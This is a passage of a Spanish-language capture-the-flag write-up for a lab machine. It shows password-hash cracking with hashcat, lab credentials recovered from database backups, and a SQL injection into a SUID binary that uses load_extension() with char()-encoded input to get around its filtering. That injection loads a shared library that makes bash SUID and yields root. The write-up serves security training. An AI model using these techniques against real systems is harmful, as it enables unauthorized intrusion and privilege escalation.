+<span id="cb21-73"><a href="#cb21-73" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;ZipMonster&quot;</span></span>
+<span id="cb21-74"><a href="#cb21-74" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=ZipMonster&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-75"><a href="#cb21-75" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;bsdicrypt&quot;</span></span>
+<span id="cb21-76"><a href="#cb21-76" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=bsdicrypt&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-77"><a href="#cb21-77" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;HMAC-SHA384&quot;</span></span>
+<span id="cb21-78"><a href="#cb21-78" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=HMAC-SHA384&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-79"><a href="#cb21-79" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;oracle11&quot;</span></span>
+<span id="cb21-80"><a href="#cb21-80" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=oracle11&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-81"><a href="#cb21-81" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;xsha&quot;</span></span>
+<span id="cb21-82"><a href="#cb21-82" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=xsha&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-83"><a href="#cb21-83" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;lotus85&quot;</span></span>
+<span id="cb21-84"><a href="#cb21-84" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=lotus85&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-85"><a href="#cb21-85" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;HAVAL-256-3&quot;</span></span>
+<span id="cb21-86"><a href="#cb21-86" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=HAVAL-256-3&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-87"><a href="#cb21-87" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;plaintext&quot;</span></span>
+<span id="cb21-88"><a href="#cb21-88" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=plaintext&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-89"><a href="#cb21-89" aria-hidden="true"></a><span class="ex">Using</span> default input encoding: UTF-8</span>
+<span id="cb21-90"><a href="#cb21-90" aria-hidden="true"></a><span class="ex">Loaded</span> 402687 password hashes with no different salts (tripcode [DES 256/256 AVX2])</span>
+<span id="cb21-91"><a href="#cb21-91" aria-hidden="true"></a><span class="ex">Warning</span>: poor OpenMP scalability for this hash type, consider --fork=6</span>
+<span id="cb21-92"><a href="#cb21-92" aria-hidden="true"></a><span class="ex">Will</span> run 6 OpenMP threads</span>
+<span id="cb21-93"><a href="#cb21-93" aria-hidden="true"></a><span class="ex">Press</span> <span class="st">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key for status</span>
+<span id="cb21-94"><a href="#cb21-94" aria-hidden="true"></a><span class="ex">0g</span> 0:00:00:00 DONE (2024-03-03 10:19) <span class="ex">0g/s</span> 39355p/s 39355c/s 15847MC/s 123456..sss</span>
+<span id="cb21-95"><a href="#cb21-95" aria-hidden="true"></a><span class="ex">Session</span> completed</span></code></pre></div>
+<p>Con <strong>hashid</strong> vemos que el hash posiblemente sea <strong>Django(SHA-1)</strong>.</p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true"></a>❯ <span class="ex">hashid</span> <span class="st">&#39;sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a&#39;</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true"></a><span class="ex">Analyzing</span> <span class="st">&#39;sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a&#39;</span></span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true"></a>[<span class="ex">+</span>] Django(SHA-1) </span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true"></a>[<span class="ex">+</span>] SAP CODVN F/G (PASSCODE) </span></code></pre></div>
+<p>Tratamos de crackear los hashes utilizando <strong>hashcat</strong> mirando primero el tipo del hash.</p>
+<div class="sourceCode" id="cb23"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true"></a>❯ <span class="ex">hashcat</span> --example-hashes <span class="kw">|</span> <span class="fu">grep</span> -i <span class="st">&quot;Django (SHA-1)&quot;</span> -B 1 -A 2</span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true"></a><span class="ex">MODE</span>: 124</span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true"></a><span class="ex">TYPE</span>: Django (SHA-1)</span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true"></a><span class="ex">HASH</span>: sha1<span class="va">$fe76b$0</span>2d5916550edf7fc8c886f044887f4b1abf9b013</span>
+<span id="cb23-5"><a href="#cb23-5" aria-hidden="true"></a><span class="ex">PASS</span>: hashcat</span></code></pre></div>
+<p>Sabiendo ahora el tipo de hash procederemos ha realizar el ataque de fuerza bruta.</p>
+<div class="sourceCode" id="cb24"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true"></a>❯ <span class="ex">hashcat</span> -a 0 -m 124 hashes /usr/share/wordlists/rockyou.txt</span></code></pre></div>
+<table>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-a</td>
+<td>Especifica el tipo de ataque que se realizará</td>
+</tr>
+<tr class="even">
+<td>-m</td>
+<td>Especifica el tipo de hash que se está intentara romper</td>
+</tr>
+</tbody>
+</table>
+<p>Solo nos ha descubierto la contraseña <strong>john316</strong>.</p>
+<img src="Img/Pasted image 20240303103354 1.png">
+<p>Descomprimimos los archivos con la contraseña <strong>H@ckThisP<span class="citation" data-cites="ssW0rDIfY0uC">@ssW0rDIfY0uC</span><span class="citation" data-cites="n">@n</span>:)</strong> vista en el archivo <strong>db_backup.sh</strong> del repositorio anteriormente visto, y vemos que todos contienen un archivo de base de datos <strong>db.sqlite3</strong>.</p>
+<div class="sourceCode" id="cb25"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true"></a>❯ <span class="ex">tree</span></span>
+<span id="cb25-2"><a href="#cb25-2" aria-hidden="true"></a><span class="ex">.</span></span>
+<span id="cb25-3"><a href="#cb25-3" aria-hidden="true"></a>├── <span class="ex">1</span></span>
+<span id="cb25-4"><a href="#cb25-4" aria-hidden="true"></a>│   ├── <span class="ex">01_Mar_db_backup.sqlite3.7z</span></span>
+<span id="cb25-5"><a href="#cb25-5" aria-hidden="true"></a>│   └── <span class="ex">db.sqlite3</span></span>
+<span id="cb25-6"><a href="#cb25-6" aria-hidden="true"></a>├── <span class="ex">2</span></span>
+<span id="cb25-7"><a href="#cb25-7" aria-hidden="true"></a>│   ├── <span class="ex">1_Dec_db_backup.sqlite3.7z</span></span>
+<span id="cb25-8"><a href="#cb25-8" aria-hidden="true"></a>│   └── <span class="ex">DoodleGrive</span></span>
+<span id="cb25-9"><a href="#cb25-9" aria-hidden="true"></a>│       └── <span class="ex">db.sqlite3</span></span>
+<span id="cb25-10"><a href="#cb25-10" aria-hidden="true"></a>├── <span class="ex">3</span></span>
+<span id="cb25-11"><a href="#cb25-11" aria-hidden="true"></a>│   ├── <span class="ex">1_Nov_db_backup.sqlite3.7z</span></span>
+<span id="cb25-12"><a href="#cb25-12" aria-hidden="true"></a>│   └── <span class="ex">db.sqlite3</span></span>
+<span id="cb25-13"><a href="#cb25-13" aria-hidden="true"></a>├── <span class="ex">4</span></span>
+<span id="cb25-14"><a href="#cb25-14" aria-hidden="true"></a>│   ├── <span class="ex">1_Oct_db_backup.sqlite3.7z</span></span>
+<span id="cb25-15"><a href="#cb25-15" aria-hidden="true"></a>│   └── <span class="ex">db.sqlite3</span></span>
+<span id="cb25-16"><a href="#cb25-16" aria-hidden="true"></a>├── <span class="ex">5</span></span>
+<span id="cb25-17"><a href="#cb25-17" aria-hidden="true"></a>│   ├── <span class="ex">1_Sep_db_backup.sqlite3.7z</span></span>
+<span id="cb25-18"><a href="#cb25-18" aria-hidden="true"></a>│   └── <span class="ex">db.sqlite3</span></span>
+<span id="cb25-19"><a href="#cb25-19" aria-hidden="true"></a>├── <span class="ex">comprimido.zip</span></span>
+<span id="cb25-20"><a href="#cb25-20" aria-hidden="true"></a>├── <span class="ex">credentials.txt</span></span>
+<span id="cb25-21"><a href="#cb25-21" aria-hidden="true"></a>└── <span class="ex">hashes</span></span></code></pre></div>
+<p>para no estar realizando el mismo procedimiento para buscar los hashes con el parámetro <strong>–line</strong> de <strong>sqlite3</strong> podemos automatizar todo eso y pillar los hashes.</p>
+<div class="sourceCode" id="cb26"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true"></a>❯ <span class="fu">find</span> . -name <span class="st">&quot;db.sqlite3&quot;</span> <span class="kw">|</span> <span class="kw">while</span> <span class="bu">read</span> <span class="va">line</span>; <span class="kw">do</span> <span class="ex">sqlite3</span> <span class="va">$line</span> --line <span class="st">&#39;select * from accounts_customuser&#39;</span><span class="kw">;done</span> <span class="kw">|</span> <span class="fu">grep</span> password <span class="kw">|</span> <span class="fu">awk</span> <span class="st">&#39;NF{print $NF}&#39;</span> <span class="kw">|</span> <span class="fu">grep</span> -v <span class="st">&quot;pbkdf2&quot;</span></span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$W5IGzMqPgAUGMKXwKRmi08$0</span>30814d90a6a50ac29bb48e0954a89132302483a</span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$E9cadw34Gx4E59Qt18NLXR$6</span>0919b923803c52057c0cdd1d58f0409e7212e9f</span>
+<span id="cb26-4"><a href="#cb26-4" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$Ri2bP6RVoZD5XYGzeYWr7c$4</span>053cb928103b6a9798b2521c4100db88969525a</span>
+<span id="cb26-5"><a href="#cb26-5" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$ALgmoJHkrqcEDinLzpILpD$4</span>b835a084a7c65f5fe966d522c0efcdd1d6f879f</span>
+<span id="cb26-6"><a href="#cb26-6" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$jzpj8fqBgy66yby2vX5XPa$5</span>2f17d6118fce501e3b60de360d4c311337836a3</span>
+<span id="cb26-7"><a href="#cb26-7" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$W5IGzMqPgAUGMKXwKRmi08$0</span>30814d90a6a50ac29bb48e0954a89132302483a</span>
+<span id="cb26-8"><a href="#cb26-8" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$E9cadw34Gx4E59Qt18NLXR$6</span>0919b923803c52057c0cdd1d58f0409e7212e9f</span>
+<span id="cb26-9"><a href="#cb26-9" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$Ri2bP6RVoZD5XYGzeYWr7c$7</span>1eb1093e10d8f7f4d1eb64fa604e6050f8ad141</span>
+<span id="cb26-10"><a href="#cb26-10" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$ALgmoJHkrqcEDinLzpILpD$4</span>b835a084a7c65f5fe966d522c0efcdd1d6f879f</span>
+<span id="cb26-11"><a href="#cb26-11" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$jzpj8fqBgy66yby2vX5XPa$5</span>2f17d6118fce501e3b60de360d4c311337836a3</span>
+<span id="cb26-12"><a href="#cb26-12" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$W5IGzMqPgAUGMKXwKRmi08$0</span>30814d90a6a50ac29bb48e0954a89132302483a</span>
+<span id="cb26-13"><a href="#cb26-13" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$E9cadw34Gx4E59Qt18NLXR$6</span>0919b923803c52057c0cdd1d58f0409e7212e9f</span>
+<span id="cb26-14"><a href="#cb26-14" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$DhWa3Bym5bj9Ig73wYZRls$3</span>ecc0c96b090dea7dfa0684b9a1521349170fc93</span>
+<span id="cb26-15"><a href="#cb26-15" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$ALgmoJHkrqcEDinLzpILpD$4</span>b835a084a7c65f5fe966d522c0efcdd1d6f879f</span>
+<span id="cb26-16"><a href="#cb26-16" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$jzpj8fqBgy66yby2vX5XPa$5</span>2f17d6118fce501e3b60de360d4c311337836a3</span></code></pre></div>
+<p>Con los hashes descubiertos realizamos de nuevo el ataque de fuerza bruta mostrándonos ahora 3 nuevas contraseñas.</p>
+<img src="Img/Pasted image 20240303112038 1.png">
+<p>Viendo que hay 2 usuario mas en el sistema probamos las 4 contraseñas para los usuarios <strong>cris</strong> y <strong>tom</strong>.</p>
+<div class="sourceCode" id="cb27"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true"></a><span class="ex">martin@drive</span>:~$ cat /etc/passwd <span class="kw">|</span> <span class="fu">grep</span> <span class="st">&quot;sh$&quot;</span></span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true"></a><span class="ex">root</span>:x:0:0:root:/root:/bin/bash</span>
+<span id="cb27-3"><a href="#cb27-3" aria-hidden="true"></a><span class="ex">git</span>:x:115:119:Git Version Control,,,:/home/git:/bin/bash</span>
+<span id="cb27-4"><a href="#cb27-4" aria-hidden="true"></a><span class="ex">martin</span>:x:1001:1001:martin cruz,,,:/home/martin:/bin/bash</span>
+<span id="cb27-5"><a href="#cb27-5" aria-hidden="true"></a><span class="ex">cris</span>:x:1002:1002:Cris Disel,,,:/home/cris:/bin/bash</span>
+<span id="cb27-6"><a href="#cb27-6" aria-hidden="true"></a><span class="ex">tom</span>:x:1003:1003:Tom Hands,,,:/home/tom:/bin/bash</span></code></pre></div>
+<div class="sourceCode" id="cb28"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true"></a>❯ <span class="ex">catn</span> credentials.txt</span>
+<span id="cb28-2"><a href="#cb28-2" aria-hidden="true"></a><span class="ex">martin</span>:Xk4@KjyrYv8t194L!</span>
+<span id="cb28-3"><a href="#cb28-3" aria-hidden="true"></a><span class="ex">john316</span></span>
+<span id="cb28-4"><a href="#cb28-4" aria-hidden="true"></a><span class="ex">johniscool</span></span>
+<span id="cb28-5"><a href="#cb28-5" aria-hidden="true"></a><span class="ex">john</span> boy</span>
+<span id="cb28-6"><a href="#cb28-6" aria-hidden="true"></a><span class="ex">johnmayer7</span></span></code></pre></div>
+<p>Al autenticarnos como el usuario <strong>tom</strong> utilizando la contraseña <strong>johnmayer7</strong>, logramos acceder a la cuenta y ver la primera flag.</p>
+<div class="sourceCode" id="cb29"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true"></a><span class="ex">martin@drive</span>:~$ su tom</span>
+<span id="cb29-2"><a href="#cb29-2" aria-hidden="true"></a><span class="ex">Password</span>: </span>
+<span id="cb29-3"><a href="#cb29-3" aria-hidden="true"></a><span class="ex">tom@drive</span>:/home/martin$ cd</span>
+<span id="cb29-4"><a href="#cb29-4" aria-hidden="true"></a><span class="ex">tom@drive</span>:~$ cat user.txt </span>
+<span id="cb29-5"><a href="#cb29-5" aria-hidden="true"></a><span class="ex">6fa*****************************</span></span>
+<span id="cb29-6"><a href="#cb29-6" aria-hidden="true"></a><span class="ex">tom@drive</span>:~$ </span></code></pre></div>
+<p>En el directorio personal de trabajo del usuario tom vemos un binario con permisos <strong>SUID</strong>.</p>
+<h2>Post-explotación</h2>
+<div class="sourceCode" id="cb30"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true"></a><span class="ex">tom@drive</span>:~$ ls -l</span>
+<span id="cb30-2"><a href="#cb30-2" aria-hidden="true"></a><span class="ex">total</span> 880</span>
+<span id="cb30-3"><a href="#cb30-3" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 tom  tom      0 Mar  2 09:42 db.sqlite3</span>
+<span id="cb30-4"><a href="#cb30-4" aria-hidden="true"></a><span class="ex">-rwSr-x---</span> 1 root tom 887240 Sep 13 13:36 doodleGrive-cli</span>
+<span id="cb30-5"><a href="#cb30-5" aria-hidden="true"></a><span class="ex">-rw-rw-r--</span> 1 tom  tom    172 Mar  2 10:06 konz.c</span>
+<span id="cb30-6"><a href="#cb30-6" aria-hidden="true"></a><span class="ex">-rw-r-----</span> 1 root tom    719 Feb 11  2023 README.txt</span>
+<span id="cb30-7"><a href="#cb30-7" aria-hidden="true"></a><span class="ex">-rw-r-----</span> 1 root tom     33 Mar  1 05:01 user.txt</span></code></pre></div>
+<p>Si ejecutamos el binario vemos que nos pide un nombre de usuario.</p>
+<div class="sourceCode" id="cb31"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true"></a><span class="ex">tom@drive</span>:~$ ./doodleGrive-cli </span>
+<span id="cb31-2"><a href="#cb31-2" aria-hidden="true"></a>[!]<span class="ex">Caution</span> this tool still in the development phase...please report any issue to the development team[!]</span>
+<span id="cb31-3"><a href="#cb31-3" aria-hidden="true"></a><span class="ex">Enter</span> Username:</span></code></pre></div>
+<p>Con el comando <strong>strings</strong> vemos los caracteres imprimibles, mostrándonos el nombre de usuario <strong>moriarty</strong> con la contraseña <strong>findMeIfY0uC@nMr.Holmz!</strong>.</p>
+<img src="Img/Pasted image 20240303120325 1.png">
+<p>Al poner las credenciales nos muestra un menu.</p>
+<div class="sourceCode" id="cb32"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true"></a><span class="ex">tom@drive</span>:~$ ./doodleGrive-cli </span>
+<span id="cb32-2"><a href="#cb32-2" aria-hidden="true"></a>[!]<span class="ex">Caution</span> this tool still in the development phase...please report any issue to the development team[!]</span>
+<span id="cb32-3"><a href="#cb32-3" aria-hidden="true"></a><span class="ex">Enter</span> Username:</span>
+<span id="cb32-4"><a href="#cb32-4" aria-hidden="true"></a><span class="ex">moriarty</span></span>
+<span id="cb32-5"><a href="#cb32-5" aria-hidden="true"></a><span class="ex">Enter</span> password for moriarty:</span>
+<span id="cb32-6"><a href="#cb32-6" aria-hidden="true"></a><span class="ex">findMeIfY0uC@nMr.Holmz</span>!     </span>
+<span id="cb32-7"><a href="#cb32-7" aria-hidden="true"></a><span class="ex">Welcome...</span>!</span>
+<span id="cb32-8"><a href="#cb32-8" aria-hidden="true"></a></span>
+<span id="cb32-9"><a href="#cb32-9" aria-hidden="true"></a><span class="ex">doodleGrive</span> cli beta-2.2: </span>
+<span id="cb32-10"><a href="#cb32-10" aria-hidden="true"></a><span class="ex">1.</span> Show users list and info</span>
+<span id="cb32-11"><a href="#cb32-11" aria-hidden="true"></a><span class="ex">2.</span> Show groups list</span>
+<span id="cb32-12"><a href="#cb32-12" aria-hidden="true"></a><span class="ex">3.</span> Check server health and status</span>
+<span id="cb32-13"><a href="#cb32-13" aria-hidden="true"></a><span class="ex">4.</span> Show server requests log (last 1000 request)</span>
+<span id="cb32-14"><a href="#cb32-14" aria-hidden="true"></a><span class="ex">5.</span> activate user account</span>
+<span id="cb32-15"><a href="#cb32-15" aria-hidden="true"></a><span class="ex">6.</span> Exit</span>
+<span id="cb32-16"><a href="#cb32-16" aria-hidden="true"></a><span class="ex">Select</span> option: </span></code></pre></div>
+<p>Utilizamos <strong>Ghidra</strong> para ver por detrás como funciona el binario.</p>
+<img src="Img/Pasted image 20240303125236 1.png">
+<div class="sourceCode" id="cb33"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true"></a>❯ <span class="ex">ghidra</span></span></code></pre></div>
+<img src="Img/Pasted image 20240423100310.png">
+<img src="Img/Pasted image 20240423100122.png">
+<img src="Img/Pasted image 20240423100223.png">
+<img src="Img/Pasted image 20240423100514.png">
+<img src="Img/Pasted image 20240423101155.png">
+<p>Vemos la función main.</p>
+<img src="Img/Pasted image 20240303131155 1.png">
+<p>En caso de que se proporcionen las credenciales correctas se ejecutara la función <strong>main_menu()</strong>.</p>
+<img src="Img/Pasted image 20240303132308 1.png">
+<p>Dentro de la función <strong>main_menu()</strong>.</p>
+<img src="Img/Pasted image 20240304095255.png">
+<p>Vemos que en caso de que se elija la opción 5 ejecutara la función <strong>activate_user_account()</strong>.</p>
+<img src="Img/Pasted image 20240304095456.png">
+<p>Y dentro de esa función pide un usuario, en caso de que el valor del usuario enviado no este vacío realiza una sanitización en la función <strong>sanitize_string()</strong> que recibe la variable del valor enviado <strong>local_148</strong>.</p>
+<img src="Img/Pasted image 20240304095912.png">
+<p>En la función <strong>sanitize_string()</strong> vemos que en el valor tan largo de la variable <strong>local_29</strong> al pasarlo en formato "char" muestra varios caracteres los cuales seguramente son los badchars <strong>\\{/| ’\n\0</strong>  .</p>
+<img src="Img/Pasted image 20240304104945.png">
+<img src="Img/Pasted image 20240304104349.png">
+<img src="Img/Pasted image 20240304104523.png">
+<p>En esta parte de código vemos que esta creando un bucle que finaliza hasta que valor de <strong>local_30</strong> sea igual a 9, en la comparativa vemos que si en la posición <strong>local_38</strong> que ahora es 0 (de la cadena que se recibe <strong>param_1</strong>), sea igual a <strong>local_29</strong> <strong>\\{/| ’\n\0</strong> entonces no lo cuenta.</p>
+<img src="Img/Pasted image 20240304111438.png">
+<p>En el binario, en la parte del nombre de usuario si añadimos esos caracteres no deseados, los borra de la cadena.</p>
+<img src="Img/Pasted image 20240304112930.png">
+<p>Volviendo a la función <strong>activate_user_account()</strong> vemos que después de realizar la sanitización ejecuta un comando el cual utilizando <strong>sqlite3</strong> para conectarse al <strong>db.sqlite3</strong> con el parámetro <strong>-line</strong> ejecuta una instrucción que actualiza la tabla <strong>accounts_customuser</strong> añadiendo el valor 1 a <strong>is_active</strong> donde el nombre de usuario sea el valor de la variable <strong>local_148</strong>, y nosotros tenemos control sobre esa variable.</p>
+<img src="Img/Pasted image 20240304113818.png">
+<p>Por lo que nos podríamos aprovechar de esa variable inyectando cualquier comando si no fuera por los caracteres que se sanitizan.</p>
+<p>Vemos que con <strong>load_extension()</strong> podemos realizar un <strong>RCE</strong> cargando extensiones.</p>
+<img src="Img/Pasted image 20240304163934.png">
+<p>Aquí se detalla la funcionalidad de <a class="link" href="https://www.sqlite.org/c3ref/load_extension.html">load_extension()</a>.</p>
+<p>La idea es que a la hora de cargar una extensión se pueda crear un archivo de biblioteca compartida para cargar un comando a nivel de sistema.</p>
+<p>Cuando se crea un archivo de biblioteca compartida por defecto, SQLite intentará cargarlo para utilizarlo como función de entrada y ejecutar la instrucción u operación definida en esa extensión. SQLite buscará una función llamada “sqlite3_extension_init” en el archivo de biblioteca compartida. Sin embargo, si esta función no existe, SQLite buscará una función llamada “sqlite3_X_init”, donde “X” es el nombre del archivo quitando desde la primera barra <strong>/</strong> hasta el primer punto <strong>.</strong> y sin la palabra <strong>lib</strong>.</p>
+<p>Ej: Si creamos un archivo de biblioteca compartida con nombre “test.so” o “libtest”, quitara tanto la extensión <strong>.so</strong> como la palabra <strong>lib</strong>, quedando al final como <strong>test</strong>, para luego buscar y ejecutar la función con el nombre <strong>sqlite3_test_init</strong>.</p>
+<p>Si ponemos directamente el <strong>load_extension()</strong> no va a funciona ya que <strong>WHERE</strong> no espera ninguna otra operatoria.</p>
+<div class="sourceCode" id="cb34"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true"></a><span class="ex">/usr/bin/sqlite3</span> /var/www/DoodleGrive/db.sqlite3 -line <span class="st">&#39;UPDATE accounts_customuser SET is_active=1 WHERE username=&quot;&quot; load_extension()&quot;;</span></span></code></pre></div>
+<p>Lo que si que se puede hacer es jugar con concatenaciones <strong>+</strong>, en este caso añadimos <strong>ro</strong> y lo concatenamos con <strong>jo</strong> quedando como <strong>rojo</strong>, pero para que no quede ninguna comilla colgando añadimos otra concatenación con otra comilla.</p>
+<img src="Img/Pasted image 20240423113001.png">
+<img src="Img/Pasted image 20240423113056.png">
+<p>Por tanto realizamos una concatenación para que interprete el <strong>load_extension()</strong>, quedando de la siguiente forma <strong>"“+load_extension()+”";</strong>.</p>
+<div class="sourceCode" id="cb35"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true"></a><span class="ex">/usr/bin/sqlite3</span> /var/www/DoodleGrive/db.sqlite3 -line <span class="st">&#39;UPDATE accounts_customuser SET is_active=1 WHERE username=&quot;&quot;+load_extension()+&quot;&quot;;</span></span></code></pre></div>
+<p>Si lo ejecutamos en el binario queda tal que así.</p>
+<img src="Img/Pasted image 20240423113241.png">
+<p>Además vemos que nos funciona ya que nos pide un numero de argumentos para la función load_extension().</p>
+<p>Teniendo ya la función concatenada tratamos de agregar el archivo de biblioteca compartida.</p>
+<img src="Img/Pasted image 20240423115026.png">
+<p>Cabe resaltar que tenemos la limitante de los badchars <strong>\\{/| ’\n\0</strong>.</p>
+<p>Utilizando <strong>char()</strong> podemos pasar los caracteres a decimal pudiendo burlar la sanitización.</p>
+<img src="Img/Pasted image 20240423122918.png">
+<img src="Img/Pasted image 20240423123803.png">
+<p>Pero la cosa no acaba aquí, y es que tenemos un limite de longitud de <strong>40</strong> caracteres máximo.</p>
+<img src="Img/Pasted image 20240423123234.png">
+<div class="sourceCode" id="cb36"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true"></a>❯ <span class="bu">echo</span> <span class="st">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span> <span class="kw">|</span> <span class="fu">wc</span> -m</span>
+<span id="cb36-2"><a href="#cb36-2" aria-hidden="true"></a><span class="ex">40</span></span></code></pre></div>
+<img src="Img/Pasted image 20240423123551.png">
+<p>Por lo que para no superar ese limite, el nombre del archivo de biblioteca será únicamente una letra.</p>
+<p>Con todo esto explicado, creamos el archivo de biblioteca compartida, el cual le añadirá el permiso <strong>SUID</strong> a la bash pudiendo ejecutar el binario como el propietario, en este caso el usuario <strong>root</strong>.</p>
+<img src="Img/Pasted image 20240423131529.png">
+<p>Lo compilamos.</p>
+<div class="sourceCode" id="cb37"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true"></a><span class="ex">tom@drive</span>:~$ gcc test.c -shared -fPIC -o a</span></code></pre></div>
+<table>
+<colgroup>
+<col style="width: 9%" />
+<col style="width: 90%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-shared</td>
+<td>Se utiliza para generar un archivo compartido en lugar de un archivo ejecutable estándar.</td>
+</tr>
+<tr class="even">
+<td>-fPIC</td>
+<td>Genera código independiente de posición, lo que es esencial para las bibliotecas compartidas.</td>
+</tr>
+<tr class="odd">
+<td>-o</td>
+<td>Especifica el nombre del archivo de salida generado por el compilador.</td>
+</tr>
+</tbody>
+</table>
+<p>Con el archivo de biblioteca ya creado, habría que ejecutarlo tal que así <strong>./a</strong> y separado por comas.</p>
+<img src="Img/Pasted image 20240423130132.png">
+<p>Estos serian los caracteres en decimal.</p>
+<table>
+<thead>
+<tr class="header">
+<th>Carácter</th>
+<th>Decimal</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>.</td>
+<td>46</td>
+</tr>
+<tr class="even">
+<td>/</td>
+<td>47</td>
+</tr>
+<tr class="odd">
+<td>a</td>
+<td>97</td>
+</tr>
+</tbody>
+</table>
+<img src="Img/Pasted image 20240423130529.png">
+<p>Ahora al pasarlo al binario no pasa nada.</p>
+<img src="Img/Pasted image 20240423131707.png">
+<p>Pero al mirar los permisos del binario <strong>bash</strong> podemos ver que tiene el permiso SUID.</p>
+<img src="Img/Pasted image 20240423131732.png"> Pudiendo finalmente acceder como el usuario <strong>root</strong> y visualizar la ultima flag.
+<div class="sourceCode" id="cb38"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true"></a><span class="ex">tom@drive</span>:~$ bash -p</span>
+<span id="cb38-2"><a href="#cb38-2" aria-hidden="true"></a><span class="ex">bash-5.0</span># cd /root</span>
